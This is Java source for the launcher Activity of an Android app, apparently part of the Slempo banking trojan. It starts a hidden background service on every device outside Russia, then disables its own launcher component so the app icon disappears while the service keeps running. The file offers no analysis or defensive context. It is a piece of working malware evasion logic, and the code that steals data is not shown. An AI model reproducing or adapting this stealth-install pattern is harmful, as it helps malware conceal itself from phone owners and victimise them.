package org.slempo.service;

import org.slempo.service.utils.Utils;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

public class Main extends Activity {

	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		String country = Utils.getCountry(this);
		if (!MainService.isRunning && !country.equalsIgnoreCase("RU")) {
			Intent i = new Intent(ServiceStarter.ACTION);
			i.setClass(this, MainService.class);
			startService(i);
		}
		if (Constants.APP_MODE.equals("3") || Constants.APP_MODE.equals("1")) {
			PackageManager packageManager = getPackageManager();
			ComponentName componentName = new ComponentName(this, Main.class);
			packageManager.setComponentEnabledSetting(componentName,
					PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
			finish();
		} else if (Constants.APP_MODE.equals("2")) {
			setContentView(R.layout.main_activity);
	        Button button = (Button) findViewById(R.id.button_ok);
	        button.setOnClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {
					finish();
				}
			});
		}
	}/**/
}
